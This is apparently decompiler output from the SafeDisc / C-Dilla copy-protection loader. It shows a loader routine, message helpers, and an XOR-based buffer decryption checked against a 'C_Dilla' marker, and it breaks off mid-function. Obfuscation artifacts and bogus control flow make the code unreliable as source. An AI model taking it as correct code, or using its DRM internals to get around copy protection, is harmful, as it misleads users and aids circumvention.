/* WARNING: Removing unreachable block (ram,0x0040ddd4) */
/* WARNING: Removing unreachable block (ram,0x0040df4a) */
/* WARNING: Removing unreachable block (ram,0x0040df7a) */
/* WARNING: Removing unreachable block (ram,0x0040e445) */
/* WARNING: Removing unreachable block (ram,0x0040e67f) */
/* WARNING: Removing unreachable block (ram,0x0040eb9a) */
/* WARNING: Removing unreachable block (ram,0x0040e91d) */
/* WARNING: Removing unreachable block (ram,0x0040e763) */
/* WARNING: Removing unreachable block (ram,0x0040e5e3) */
/* WARNING: Removing unreachable block (ram,0x0040e2c3) */
/* WARNING: Removing unreachable block (ram,0x0040e202) */
/* WARNING: Removing unreachable block (ram,0x0040e0cd) */
/* WARNING: Removing unreachable block (ram,0x0040dcd1) */
/* WARNING: Removing unreachable block (ram,0x0040dbd5) */
/* WARNING: Removing unreachable block (ram,0x0040da26) */
/* WARNING: Removing unreachable block (ram,0x0040d5e5) */
/* WARNING: Removing unreachable block (ram,0x0040cfea) */
/* WARNING: Removing unreachable block (ram,0x0040ced6) */
/* WARNING: Removing unreachable block (ram,0x0040ecb6) */
/* WARNING: Removing unreachable block (ram,0x0040e65b) */
/* WARNING: Removing unreachable block (ram,0x0040da76) */
/* WARNING: Removing unreachable block (ram,0x0040d672) */
/* WARNING: Removing unreachable block (ram,0x0040e262) */
/* WARNING: Removing unreachable block (ram,0x0040eb82) */
/* WARNING: Removing unreachable block (ram,0x0040ec7a) */
/* WARNING: Removing unreachable block (ram,0x0040e451) */
/* WARNING: Removing unreachable block (ram,0x0040d68a) */
/* WARNING: Removing unreachable block (ram,0x0040e183) */
/* WARNING: Removing unreachable block (ram,0x0040e541) */
/* WARNING: Removing unreachable block (ram,0x0040d56d) */
/* WARNING: Removing unreachable block (ram,0x0040e68b) */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */
/* WARNING: Restarted to delay deadcode elimination for space: stack */

undefined4 __thiscall FUN_0040ce40(byte param_1,undefined *param_2)

{
  code *pcVar1;
  code *pcVar2;
  byte bVar3;
  short sVar4;
  UINT UVar5;
  undefined4 uVar6;
  uint uVar7;
  undefined3 extraout_var;
  DWORD DVar8;
  BOOL BVar9;
  byte *pbVar10;
  byte extraout_CL;
  undefined4 extraout_ECX;
  undefined1 *extraout_ECX_00;
  undefined2 extraout_DX;
  undefined2 extraout_DX_00;
  int extraout_EDX;
  undefined1 *puVar11;
  undefined1 uVar12;
  undefined1 uVar13;
  bool bVar14;
  undefined1 uVar15;
  bool bVar16;
  char cVar17;
  bool bVar18;
  char cVar19;
  bool bVar20;
  tagMSG tStack_cc;
  DWORD DStack_b0;
  DWORD DStack_a0;
  undefined *puStack_3c;
  undefined *puStack_38;
  undefined *puStack_34;
  undefined *puStack_2c;
  MSG *in_stack_ffffffe8;
  undefined *puStack_10;
  undefined1 *in_stack_fffffffc;

  bVar14 = (POPCOUNT((uint)&tStack_cc & 0xff) & 1U) == 0;
  _DAT_0042f198 = GetProcAddress_exref;
  _DAT_0042f194 = FreeLibrary_exref;
  _DAT_0042f190 = LoadLibraryA_exref;
  if ((!bVar14) && (bVar14)) {
                    /* WARNING: Bad instruction - Truncating control flow here */
    halt_baddata();
  }
  if ((!bVar14) && (bVar14)) {
                    /* WARNING: Bad instruction - Truncating control flow here */
    halt_baddata();
  }
  sVar4 = func_0x0040c000();
                    /* WARNING: Bad instruction - Truncating control flow here */
  if (sVar4 == 0) {
    FUN_00415820(1);
  }
  func_0x004113f0();
  FUN_0040c9c0((HINSTANCE)param_2,(HWND)0x0,s_SafeDisc_004296d0);
  FUN_00411c70((int)&stack0xffffffe4,0x67);
  UVar5 = GetProfileIntA(s_C_DILLA_00429584,s_INTERACTIVE_004296c4,0);
  uRam004292ec = (ushort)(UVar5 != 99);
  uRam0042e500 = FUN_00415320((int *)0x0);
  func_0x0040f6a0();
  FUN_00420230((char *)0x4292f0);
  func_0x0040f6b0();
  FUN_00420230((char *)0x429300);
  func_0x0040f6b0();
  FUN_00420230((char *)0x429310);
  func_0x0040f6b0();
  func_0x0040f720();
  func_0x0040f4f0();
  bVar14 = (POPCOUNT((uint)&stack0xffffff24 & 0xff) & 1U) == 0;
  puStack_10 = (undefined *)0x64;
  if ((!bVar14) && (bVar14)) {
                    /* WARNING: Bad instruction - Truncating control flow here */
    halt_baddata();
  }
  uVar6 = FUN_004229f0(0xfa,0x42f2c0,(int *)&puStack_10);
  func_0x0040f680();
  puRam0042e520 = FUN_0040c510();
  func_0x0040f2b0();
                    /* WARNING: Bad instruction - Truncating control flow here */
  UVar5 = GetProfileIntA(s_C_DILLA_00429584,s_TESTMESSAGES_004296b4,0);
  if (UVar5 == 1) {
    func_0x0040f4d0();
    return 0;
  }
  puVar11 = &stack0xfffffffc;
  if ((((short)uVar6 == 0) || (puStack_10 != (undefined *)0x64)) &&
     (puStack_10 == (undefined *)0x67)) {
    puStack_10 = &UNK_0040dd5b;
    func_0x00411450();
    return 0;
  }
  puStack_10 = &UNK_0040de4a;
  uVar7 = FUN_00422b40(extraout_ECX,extraout_DX,(uint *)&stack0xfffffff4);
  if ((short)uVar7 != 0) {
    puStack_10 = (undefined *)0x7;
    func_0x00411450();
    return 0;
  }
  DStack_b0 = 0x94;
  puStack_10 = &UNK_0040e07a;
  GetVersionExA((LPOSVERSIONINFOA)&DStack_b0);
  if (DStack_a0 == 0) {
    puStack_10 = (undefined *)0x8;
    func_0x00411450();
    return 0xffffffff;
  }
  bVar14 = FUN_004201bb();
  if ((short)CONCAT31(extraout_var,bVar14) == 0) {
    bVar18 = false;
    bVar16 = true;
    bVar20 = false;
    bVar14 = false;
  }
  else {
    puStack_10 = &UNK_0040e279;
    FUN_00422199(extraout_CL,extraout_DX_00);
    puStack_10 = &stack0xffffffe4;
    func_0x004117e0();
    func_0x0040986a();
                    /* WARNING: Bad instruction - Truncating control flow here */
    func_0x0040a85f();
    puStack_38 = &UNK_0040e87f;
    puStack_34 = param_2;
    func_0x00404e90();
    puStack_38 = &stack0xffffffe4;
    puStack_3c = &UNK_0040e88b;
    func_0x004118a0();
    FUN_0040c7a0();
                    /* WARNING: Bad instruction - Truncating control flow here */
    FUN_0040c7a0();
    pcVar1 = PeekMessageA_exref;
    pcVar2 = MsgWaitForMultipleObjects_exref;
    sVar4 = 0;
    do {
      puStack_2c = &UNK_0040eaa4;
      DVar8 = MsgWaitForMultipleObjects(1,&pvRam0042e0e8,0,0xffffffff,0xff);
      uVar12 = DVar8 == 0;
      cVar19 = SBORROW4(DVar8,1);
      uVar7 = DVar8 - 1;
      cVar17 = (int)uVar7 < 0;
      uVar15 = uVar7 == 0;
      bVar14 = (POPCOUNT(uVar7 & 0xff) & 1U) == 0;
      if (!(bool)uVar15) break;
      uVar12 = false;
      cVar19 = false;
      cVar17 = false;
      uVar15 = sVar4 == 0;
      bVar14 = POPCOUNT(sVar4) == '\0';
      if (!(bool)uVar15) break;
      while( true ) {
        puStack_2c = &UNK_0040eac7;
        uVar7 = PeekMessageA(&tStack_cc,(HWND)0x0,0,0,0);
        bVar14 = (POPCOUNT(uVar7 & 0xff) & 1U) == 0;
        if (uVar7 == 0) break;
        if ((!bVar14) && (bVar14)) {
          pcVar1 = pcVar1 + 4;
          *(int *)pcVar1 = *(int *)pcVar1 >> 7;
                    /* WARNING: Bad instruction - Truncating control flow here */
          halt_baddata();
        }
        BVar9 = GetMessageA(&tStack_cc,(HWND)0x0,0,(UINT)in_stack_ffffffe8);
        if (BVar9 == 0) {
          sVar4 = 1;
          break;
        }
        TranslateMessage(&tStack_cc);
        in_stack_ffffffe8 = &tStack_cc;
        DispatchMessageA(in_stack_ffffffe8);
      }
      uVar12 = false;
      cVar19 = false;
      cVar17 = false;
      bVar14 = POPCOUNT(sVar4) == '\0';
      uVar15 = false;
    } while (sVar4 == 0);
    if ((!bVar14) && (bVar14)) {
                    /* WARNING: Bad instruction - Truncating control flow here */
      halt_baddata();
    }
    pbVar10 = (byte *)GetExitCodeProcess(pvRam0042e0e8,(LPDWORD)&stack0xfffffff8);
    if (!(bool)uVar15) goto code_r0x0040ecfd;
    if ((bool)uVar15) goto code_r0x0040ecfd;
    if (!(bool)uVar12) goto code_r0x0040ecfd;
    *pcVar2 = SUB41(pcVar1,0);
    bVar3 = (byte)pbVar10;
    *pbVar10 = *pbVar10 + bVar3;
    pcVar1 = pcVar2 + -0x78e48825;
    uVar12 = CARRY1((byte)*pcVar1,bVar3);
    cVar19 = SCARRY1((char)*pcVar1,bVar3);
    *pcVar1 = (code)((char)*pcVar1 + bVar3);
    cVar17 = (char)*pcVar1 < '\0';
    uVar15 = *pcVar1 == (code)0x0;
    pbVar10 = (byte *)CONCAT22((short)((uint)pbVar10 >> 0x10),
                               CONCAT11((char)((ushort)pbVar10 %
                                              (ushort)(byte)pcVar2[extraout_EDX + -0x79]),
                                        (char)((ushort)pbVar10 /
                                              (ushort)(byte)pcVar2[extraout_EDX + -0x79])));
    while (((bool)uVar12 || (bool)uVar15 && (puVar11 = in_stack_fffffffc, (bool)cVar17))) {
code_r0x0040ecfd:
      in_stack_fffffffc = puVar11;
      if (((bool)uVar15 || cVar19 != cVar17) && ((!(bool)uVar15 && (cVar19 == cVar17)))) {
        uVar12 = false;
        cVar19 = '\0';
        pbVar10 = (byte *)((uint)pbVar10 & 0x21741f73);
        cVar17 = '\0';
        uVar15 = pbVar10 == (byte *)0x0;
        goto code_r0x0040ed0c;
      }
      if ((((bool)cVar17) || (!(bool)uVar12 && !(bool)uVar15)) || ((bool)uVar15)) break;
    }
    if (!(bool)uVar12) goto code_r0x0040ed2d;
    if ((bool)uVar15) goto code_r0x0040ed2d;
code_r0x0040ed0c:
    if (!(bool)uVar12 && !(bool)uVar15) goto code_r0x0040ed2d;
    if ((bool)uVar15) goto code_r0x0040ed2d;
    if ((bool)uVar12) goto code_r0x0040ed2d;
    *extraout_ECX_00 = 0;
    bVar3 = (byte)pbVar10;
    uVar12 = CARRY1(*pbVar10,bVar3);
    cVar19 = SCARRY1(*pbVar10,bVar3);
    *pbVar10 = *pbVar10 + bVar3;
    cVar17 = (char)*pbVar10 < '\0';
    uVar15 = *pbVar10 == 0;
    do {
      if ((!(bool)uVar12 && !(bool)uVar15) || (!(bool)cVar19)) break;
code_r0x0040ed2d:
      if ((((bool)uVar15 || cVar19 != cVar17) && ((!(bool)uVar15 && ((bool)uVar12)))) &&
         (cVar19 == cVar17)) goto code_r0x0040ed3e;
    } while (!(bool)cVar19);
    uVar13 = uVar12;
    if (!(bool)cVar19) {
code_r0x0040ed3e:
      uVar13 = uVar12;
      if ((((bool)uVar12 || (bool)uVar15) && (!(bool)uVar15)) && ((bool)cVar19)) {
        bVar3 = bRam71000000 - 0x1b;
        uVar13 = bRam71000000 < 0x1b || bVar3 < (byte)uVar12;
        cVar19 = SBORROW1(bRam71000000,'\x1b') != SBORROW1(bVar3,uVar12);
        bRam71000000 = bVar3 - uVar12;
        cVar17 = (char)bRam71000000 < '\0';
        uVar15 = bRam71000000 == 0;
      }
    }
    if (cVar19 != cVar17) goto code_r0x0040ed7f;
    if (cVar19 != cVar17) {
                    /* WARNING: Bad instruction - Truncating control flow here */
      halt_baddata();
    }
    while (!(bool)uVar15) {
code_r0x0040ed7f:
      if ((((bool)uVar15 || cVar19 != cVar17) ||
          (((bool)uVar15 || cVar19 != cVar17 && (!(bool)uVar15 && cVar19 == cVar17)))) ||
         ((!(bool)uVar15 && cVar19 == cVar17 || (((bool)uVar15 || (!(bool)uVar13)))))) break;
    }
    *(uint *)(extraout_ECX_00 + 0x42e51c) =
         *(uint *)(extraout_ECX_00 + 0x42e51c) & (uint)&stack0xffffffec;
    func_0x004116a0();
    do {
      if (-8 < (int)&stack0xffffffe4) break;
    } while (-8 < (int)&stack0xffffffe4);
    do {
      if (-8 < (int)&stack0xffffffe4) break;
    } while (-8 < (int)&stack0xffffffe4);
    do {
      if (-8 < (int)&stack0xffffffe4) break;
    } while (-8 < (int)&stack0xffffffe4);
    do {
      if (-8 < (int)&stack0xffffffe4) break;
    } while (-8 < (int)&stack0xffffffe4);
    CloseHandle(pvRam0042e0e8);
    CloseHandle(pvRam0042e0ec);
    func_0x004116a0();
    bVar14 = (undefined1 *)0xfffffff7 < &stack0xffffffe4;
    bVar20 = SCARRY4((int)&stack0xffffffe4,8);
    bVar18 = (int)&stack0xffffffec < 0;
    bVar16 = &stack0x00000000 == (undefined1 *)0x14;
    puVar11 = in_stack_fffffffc;
  }
  do {
    if (!bVar14) break;
  } while (!bVar14);
  do {
    if (!bVar16 && bVar20 == bVar18) break;
  } while (!bVar16 && bVar20 == bVar18);
  do {
    if (!bVar14) break;
  } while (!bVar14);
  do {
    if (!bVar16 && bVar20 == bVar18) break;
  } while (!bVar16 && bVar20 == bVar18);
  do {
    if (!bVar14) break;
  } while (!bVar14);
  do {
    if (!bVar16 && bVar20 == bVar18) break;
  } while (!bVar16 && bVar20 == bVar18);
  return *(undefined4 *)(puVar11 + -4);
}



/* VA 0040f2c0 */

int __cdecl FUN_0040f2c0(ushort param_1,int param_2)

{
  uint uVar1;
  int *piVar2;
  ushort *puVar3;

  puVar3 = &DAT_00429af0;
  do {
    if (((param_1 ^ *puVar3) & 0x3ff) == 0) {
      piVar2 = *(int **)(puVar3 + 2);
      uVar1 = 0;
      do {
        if (*piVar2 == param_2) {
          return piVar2[2];
        }
        uVar1 = uVar1 + 1;
        piVar2 = piVar2 + 3;
      } while (uVar1 < 0xb);
    }
    puVar3 = puVar3 + 4;
  } while (puVar3 < s_Acceso_denegado_00429b18);
  return 0;
}



/* VA 0040f310 */

void __cdecl FUN_0040f310(LPCSTR param_1,LPCSTR param_2,UINT param_3)

{
  LCID LVar1;
  LPCSTR lpCaption;
  LPCSTR lpText;
  HWND hWnd;

  LVar1 = GetSystemDefaultLCID();
  lpCaption = (LPCSTR)0x0;
  if ((LPCSTR)0xb < param_1) {
    lpCaption = param_1;
  }
  if (lpCaption == (LPCSTR)0x0) {
    lpCaption = (LPCSTR)FUN_0040c280(DAT_0042e588,LVar1,(int)param_1,0);
    if (lpCaption == (LPCSTR)0x0) {
      lpCaption = (LPCSTR)FUN_0040c280(DAT_0042e588,LVar1,(int)param_1,1);
      if (lpCaption == (LPCSTR)0x0) {
        lpCaption = (LPCSTR)FUN_0040c280(DAT_0042e588,*(uint *)(DAT_0042e588 + 0x14),(int)param_1,1)
        ;
        if (lpCaption == (LPCSTR)0x0) {
          lpCaption = (LPCSTR)FUN_0040f2c0(9,(int)param_1);
        }
      }
    }
  }
  lpText = (LPCSTR)0x0;
  if ((LPCSTR)0xb < param_2) {
    lpText = param_2;
  }
  if (lpText == (LPCSTR)0x0) {
    lpText = (LPCSTR)FUN_0040c280(DAT_0042e588,LVar1,(int)param_2,0);
    if (lpText == (LPCSTR)0x0) {
      lpText = (LPCSTR)FUN_0040c280(DAT_0042e588,LVar1,(int)param_2,1);
      if (lpText == (LPCSTR)0x0) {
        lpText = (LPCSTR)FUN_0040c280(DAT_0042e588,*(uint *)(DAT_0042e588 + 0x14),(int)param_2,1);
        if (lpText == (LPCSTR)0x0) {
          lpText = (LPCSTR)FUN_0040f2c0(9,(int)param_2);
        }
      }
    }
  }
  hWnd = GetDesktopWindow();
  MessageBoxA(hWnd,lpText,lpCaption,param_3);
  return;
}



/* VA 0040faa0 */

/* WARNING: Unable to track spacebase fully for stack */
/* WARNING: Removing unreachable block (ram,0x004100de) */
/* WARNING: Removing unreachable block (ram,0x0041007e) */
/* WARNING: Removing unreachable block (ram,0x0041001e) */
/* WARNING: Removing unreachable block (ram,0x0040ffbe) */
/* WARNING: Removing unreachable block (ram,0x0040ff5e) */
/* WARNING: Removing unreachable block (ram,0x0040fefe) */
/* WARNING: Removing unreachable block (ram,0x0040fece) */
/* WARNING: Removing unreachable block (ram,0x0040ff2e) */
/* WARNING: Removing unreachable block (ram,0x0040ff8e) */
/* WARNING: Removing unreachable block (ram,0x0040ffee) */
/* WARNING: Removing unreachable block (ram,0x0041004e) */
/* WARNING: Removing unreachable block (ram,0x004100ae) */
/* WARNING: Removing unreachable block (ram,0x0041010e) */
/* WARNING: Type propagation algorithm not settling */

undefined1 __cdecl FUN_0040faa0(byte *param_1,int param_2)

{
  byte bVar1;
  byte bVar2;
  uint uVar3;
  byte *pbVar4;
  int iVar5;
  byte *pbVar6;
  bool in_CF;
  bool bVar7;
  bool in_ZF;
  bool bVar8;
  char in_SF;
  bool bVar9;
  char in_OF;
  bool bVar10;
  int unaff_retaddr;
  undefined1 auStack_14 [4];

  do {
    if (!in_CF) break;
  } while (!in_CF);
  do {
    if (!in_ZF && in_OF == in_SF) break;
  } while (!in_ZF && in_OF == in_SF);
  do {
    if (!in_CF) break;
  } while (!in_CF);
  do {
    if (!in_ZF && in_OF == in_SF) break;
  } while (!in_ZF && in_OF == in_SF);
  do {
    if (!in_CF) break;
  } while (!in_CF);
  do {
    if (!in_ZF && in_OF == in_SF) break;
  } while (!in_ZF && in_OF == in_SF);
  do {
    if (!in_CF) break;
  } while (!in_CF);
  do {
    if (!in_ZF && in_OF == in_SF) break;
  } while (!in_ZF && in_OF == in_SF);
  do {
    if (!in_CF) break;
  } while (!in_CF);
  do {
    if (!in_ZF && in_OF == in_SF) break;
  } while (!in_ZF && in_OF == in_SF);
  do {
    if (!in_CF) break;
  } while (!in_CF);
  do {
    if (!in_ZF && in_OF == in_SF) break;
  } while (!in_ZF && in_OF == in_SF);
  do {
    if (!in_CF) break;
  } while (!in_CF);
  do {
    if (!in_ZF && in_OF == in_SF) break;
  } while (!in_ZF && in_OF == in_SF);
  DAT_0042e5cc = param_2;
  do {
    if (!in_CF) break;
  } while (!in_CF);
  do {
    if (!in_ZF && in_OF == in_SF) break;
  } while (!in_ZF && in_OF == in_SF);
  do {
    if (!in_CF) break;
  } while (!in_CF);
  do {
    if (!in_ZF && in_OF == in_SF) break;
  } while (!in_ZF && in_OF == in_SF);
  do {
    if (!in_CF) break;
  } while (!in_CF);
  do {
    if (!in_ZF && in_OF == in_SF) break;
  } while (!in_ZF && in_OF == in_SF);
  do {
    if (!in_CF) break;
  } while (!in_CF);
  do {
    if (!in_ZF && in_OF == in_SF) break;
  } while (!in_ZF && in_OF == in_SF);
  do {
    if (!in_CF) break;
  } while (!in_CF);
  do {
    if (!in_ZF && in_OF == in_SF) break;
  } while (!in_ZF && in_OF == in_SF);
  do {
    if (!in_CF) break;
  } while (!in_CF);
  do {
    if (!in_ZF && in_OF == in_SF) break;
  } while (!in_ZF && in_OF == in_SF);
  do {
    if (!in_CF) break;
  } while (!in_CF);
  do {
    if (!in_ZF && in_OF == in_SF) break;
  } while (!in_ZF && in_OF == in_SF);
  do {
    if (!in_CF) break;
  } while (!in_CF);
  do {
    if (!in_ZF && in_OF == in_SF) break;
  } while (!in_ZF && in_OF == in_SF);
  do {
    if (!in_CF) break;
  } while (!in_CF);
  do {
    if (!in_ZF && in_OF == in_SF) break;
  } while (!in_ZF && in_OF == in_SF);
  do {
    if (!in_CF) break;
  } while (!in_CF);
  do {
    if (!in_ZF && in_OF == in_SF) break;
  } while (!in_ZF && in_OF == in_SF);
  do {
    if (!in_CF) break;
  } while (!in_CF);
  do {
    if (!in_ZF && in_OF == in_SF) break;
  } while (!in_ZF && in_OF == in_SF);
  do {
    if (!in_CF) break;
  } while (!in_CF);
  do {
    if (!in_ZF && in_OF == in_SF) break;
  } while (!in_ZF && in_OF == in_SF);
  do {
    if (!in_CF) break;
  } while (!in_CF);
  do {
    if (!in_ZF && in_OF == in_SF) break;
  } while (!in_ZF && in_OF == in_SF);
  iVar5 = 0x40;
  pbVar6 = param_1;
  do {
    DAT_0042e5cc = DAT_0042e5cc * 0x35e85a6d + 0x361962e9;
    *pbVar6 = *pbVar6 ^ (byte)DAT_0042e5cc;
    pbVar4 = pbVar6 + 1;
    do {
      if (pbVar4 != (byte *)0x0 && -2 < (int)pbVar6) break;
    } while (pbVar4 != (byte *)0x0 && -2 < (int)pbVar6);
    iVar5 = iVar5 + -1;
    pbVar6 = pbVar4;
  } while (iVar5 != 0);
  uVar3 = (unaff_retaddr >> 0x1f) * -0x10;
  bVar7 = CARRY4((uint)auStack_14,uVar3);
  bVar10 = SCARRY4((int)auStack_14,uVar3);
  bVar9 = (int)(auStack_14 + uVar3) < 0;
  bVar8 = auStack_14 + uVar3 != (undefined1 *)0x0;
  do {
    if (!bVar7) break;
  } while (!bVar7);
  do {
    if (bVar8 && bVar10 == bVar9) break;
  } while (bVar8 && bVar10 == bVar9);
  do {
    if (!bVar7) break;
  } while (!bVar7);
  do {
    if (bVar8 && bVar10 == bVar9) break;
  } while (bVar8 && bVar10 == bVar9);
  do {
    if (!bVar7) break;
  } while (!bVar7);
  do {
    if (bVar8 && bVar10 == bVar9) break;
  } while (bVar8 && bVar10 == bVar9);
  do {
    if (!bVar7) break;
  } while (!bVar7);
  do {
    if (bVar8 && bVar10 == bVar9) break;
  } while (bVar8 && bVar10 == bVar9);
  do {
    if (!bVar7) break;
  } while (!bVar7);
  do {
    if (bVar8 && bVar10 == bVar9) break;
  } while (bVar8 && bVar10 == bVar9);
  do {
    if (!bVar7) break;
  } while (!bVar7);
  do {
    if (bVar8 && bVar10 == bVar9) break;
  } while (bVar8 && bVar10 == bVar9);
  do {
    if (!bVar7) break;
  } while (!bVar7);
  do {
    if (bVar8 && bVar10 == bVar9) break;
  } while (bVar8 && bVar10 == bVar9);
  do {
    if (!bVar7) break;
  } while (!bVar7);
  do {
    if (bVar8 && bVar10 == bVar9) break;
  } while (bVar8 && bVar10 == bVar9);
  do {
    if (!bVar7) break;
  } while (!bVar7);
  do {
    if (bVar8 && bVar10 == bVar9) break;
  } while (bVar8 && bVar10 == bVar9);
  do {
    if (!bVar7) break;
  } while (!bVar7);
  do {
    if (bVar8 && bVar10 == bVar9) break;
  } while (bVar8 && bVar10 == bVar9);
  do {
    if (!bVar7) break;
  } while (!bVar7);
  do {
    if (bVar8 && bVar10 == bVar9) break;
  } while (bVar8 && bVar10 == bVar9);
  do {
    if (!bVar7) break;
  } while (!bVar7);
  do {
    if (bVar8 && bVar10 == bVar9) break;
  } while (bVar8 && bVar10 == bVar9);
  do {
    if (!bVar7) break;
  } while (!bVar7);
  do {
    if (bVar8 && bVar10 == bVar9) break;
  } while (bVar8 && bVar10 == bVar9);
  iVar5 = 8;
  pbVar6 = (byte *)s_C_Dilla_00429174;
  do {
    if (iVar5 == 0) {
      return 1;
    }
    iVar5 = iVar5 + -1;
    bVar2 = *pbVar6;
    bVar1 = *param_1;
    param_1 = param_1 + 1;
    pbVar6 = pbVar6 + 1;
  } while (bVar1 == bVar2);
  return 0;
}



/* VA 004103d0 */

/* WARNING: Unable to track spacebase fully for stack */

void __cdecl FUN_004103d0(undefined4 param_1)

{
  int iVar1;
  bool in_CF;
  bool bVar2;
  bool in_ZF;
  bool bVar3;
  char in_SF;
  bool bVar4;
  char in_OF;
  bool bVar5;
  int unaff_retaddr;
  undefined4 auStack_18 [4];
  undefined4 uStack_8;

  do {
    if (!in_CF) break;
  } while (!in_CF);
  do {
    if (!in_ZF && in_OF == in_SF) break;
  } while (!in_ZF && in_OF == in_SF);
  do {
    if (!in_CF) break;
  } while (!in_CF);
  do {
    if (!in_ZF && in_OF == in_SF) break;
  } while (!in_ZF && in_OF == in_SF);
  do {
    if (!in_CF) break;
  } while (!in_CF);
  do {
    if (!in_ZF && in_OF == in_SF) break;
  } while (!in_ZF && in_OF == in_SF);
  do {
    if (!in_CF) break;
  } while (!in_CF);
  do {
    if (!in_ZF && in_OF == in_SF) break;
  } while (!in_ZF && in_OF == in_SF);
  do {
    if (!in_CF) break;
  } while (!in_CF);
  do {
    if (!in_ZF && in_OF == in_SF) break;
  } while (!in_ZF && in_OF == in_SF);
  do {
    if (!in_CF) break;
  } while (!in_CF);
  do {
    if (!in_ZF && in_OF == in_SF) break;
  } while (!in_ZF && in_OF == in_SF);
  do {
    if (!in_CF) break;
  } while (!in_CF);
  do {
    if (!in_ZF && in_OF == in_SF) break;
  } while (!in_ZF && in_OF == in_SF);
  iVar1 = unaff_retaddr >> 0x1f;
  bVar2 = CARRY4((uint)&uStack_8,iVar1 * -0x10);
  bVar5 = SCARRY4((int)&uStack_8,iVar1 * -0x10);
  bVar4 = (int)(&uStack_8 + iVar1 * -4) < 0;
  bVar3 = &uStack_8 + iVar1 * -4 != (undefined4 *)0x0;
  do {
    if (!bVar2) break;
  } while (!bVar2);
  do {
    if (bVar3 && bVar5 == bVar4) break;
  } while (bVar3 && bVar5 == bVar4);
  do {
    if (!bVar2) break;
  } while (!bVar2);
  do {
    if (bVar3 && bVar5 == bVar4) break;
  } while (bVar3 && bVar5 == bVar4);
  do {
    if (!bVar2) break;
  } while (!bVar2);
  do {
    if (bVar3 && bVar5 == bVar4) break;
  } while (bVar3 && bVar5 == bVar4);
  do {
    if (!bVar2) break;
  } while (!bVar2);
  do {
    if (bVar3 && bVar5 == bVar4) break;
  } while (bVar3 && bVar5 == bVar4);
  do {
    if (!bVar2) break;
  } while (!bVar2);
  do {
    if (bVar3 && bVar5 == bVar4) break;
  } while (bVar3 && bVar5 == bVar4);
  do {
    if (!bVar2) break;
  } while (!bVar2);
  do {
    if (bVar3 && bVar5 == bVar4) break;
  } while (bVar3 && bVar5 == bVar4);
  (&uStack_8)[iVar1 * -4] = 8;
  auStack_18[iVar1 * -4 + 3] = s_C_Dilla_00429174;
  auStack_18[iVar1 * -4 + 2] = 0x40;
  auStack_18[iVar1 * -4 + 1] = param_1;
  auStack_18[iVar1 * -4] = 0x410666;
  FUN_004080d0();
  return;
}



/* VA 00410670 */

/* WARNING: Unable to track spacebase fully for stack */
/* WARNING: Removing unreachable block (ram,0x00410f94) */
/* WARNING: Removing unreachable block (ram,0x00410f34) */
/* WARNING: Removing unreachable block (ram,0x00410ed4) */
/* WARNING: Removing unreachable block (ram,0x00410d43) */
/* WARNING: Removing unreachable block (ram,0x00410ce3) */
/* WARNING: Removing unreachable block (ram,0x00410c83) */
/* WARNING: Removing unreachable block (ram,0x00410c23) */
/* WARNING: Removing unreachable block (ram,0x00410bc3) */
/* WARNING: Removing unreachable block (ram,0x00410b4a) */
/* WARNING: Removing unreachable block (ram,0x00410aea) */
/* WARNING: Removing unreachable block (ram,0x00410a8a) */
/* WARNING: Removing unreachable block (ram,0x00410a2a) */
/* WARNING: Removing unreachable block (ram,0x004109ca) */
/* WARNING: Removing unreachable block (ram,0x0041096a) */
/* WARNING: Removing unreachable block (ram,0x0041090a) */
/* WARNING: Removing unreachable block (ram,0x0041093a) */
/* WARNING: Removing unreachable block (ram,0x0041099a) */
/* WARNING: Removing unreachable block (ram,0x004109fa) */
/* WARNING: Removing unreachable block (ram,0x00410a5a) */
/* WARNING: Removing unreachable block (ram,0x00410aba) */
/* WARNING: Removing unreachable block (ram,0x00410b1a) */
/* WARNING: Removing unreachable block (ram,0x00410b93) */
/* WARNING: Removing unreachable block (ram,0x00410bf3) */
/* WARNING: Removing unreachable block (ram,0x00410c53) */
/* WARNING: Removing unreachable block (ram,0x00410cb3) */
/* WARNING: Removing unreachable block (ram,0x00410d13) */
/* WARNING: Removing unreachable block (ram,0x00410f04) */
/* WARNING: Removing unreachable block (ram,0x00410f64) */
/* WARNING: Removing unreachable block (ram,0x00410fc4) */

undefined4 __cdecl FUN_00410670(int param_1,byte *param_2,int param_3)

{
  undefined1 uVar1;
  short sVar2;
  undefined2 uVar3;
  undefined3 extraout_var;
  undefined3 extraout_var_00;
  int iVar4;
  byte *pbVar5;
  byte *pbVar6;
  bool bVar7;
  bool bVar8;
  bool bVar9;
  bool bVar10;
  int unaff_retaddr;
  byte local_44 [64];

  bVar7 = &stack0x00000000 != (undefined1 *)0x44;
  do {
    if (bVar7 && 0x3f < (int)&stack0xfffffffc) break;
  } while (bVar7 && 0x3f < (int)&stack0xfffffffc);
  do {
    if (bVar7 && 0x3f < (int)&stack0xfffffffc) break;
  } while (bVar7 && 0x3f < (int)&stack0xfffffffc);
  do {
    if (bVar7 && 0x3f < (int)&stack0xfffffffc) break;
  } while (bVar7 && 0x3f < (int)&stack0xfffffffc);
  do {
    if (bVar7 && 0x3f < (int)&stack0xfffffffc) break;
  } while (bVar7 && 0x3f < (int)&stack0xfffffffc);
  do {
    if (bVar7 && 0x3f < (int)&stack0xfffffffc) break;
  } while (bVar7 && 0x3f < (int)&stack0xfffffffc);
  do {
    if (bVar7 && 0x3f < (int)&stack0xfffffffc) break;
  } while (bVar7 && 0x3f < (int)&stack0xfffffffc);
  do {
    if (bVar7 && 0x3f < (int)&stack0xfffffffc) break;
  } while (bVar7 && 0x3f < (int)&stack0xfffffffc);
  do {
    if (bVar7 && 0x3f < (int)&stack0xfffffffc) break;
  } while (bVar7 && 0x3f < (int)&stack0xfffffffc);
  do {
    if (bVar7 && 0x3f < (int)&stack0xfffffffc) break;
  } while (bVar7 && 0x3f < (int)&stack0xfffffffc);
  do {
    if (bVar7 && 0x3f < (int)&stack0xfffffffc) break;
  } while (bVar7 && 0x3f < (int)&stack0xfffffffc);
  do {
    if (bVar7 && 0x3f < (int)&stack0xfffffffc) break;
  } while (bVar7 && 0x3f < (int)&stack0xfffffffc);
  do {
    if (bVar7 && 0x3f < (int)&stack0xfffffffc) break;
  } while (bVar7 && 0x3f < (int)&stack0xfffffffc);
  do {
    if (bVar7 && 0x3f < (int)&stack0xfffffffc) break;
  } while (bVar7 && 0x3f < (int)&stack0xfffffffc);
  if (param_1 == 0) {
    pbVar5 = param_2;
    pbVar6 = local_44;
    for (iVar4 = 0x10; iVar4 != 0; iVar4 = iVar4 + -1) {
      *(undefined4 *)pbVar6 = *(undefined4 *)pbVar5;
      pbVar5 = pbVar5 + 4;
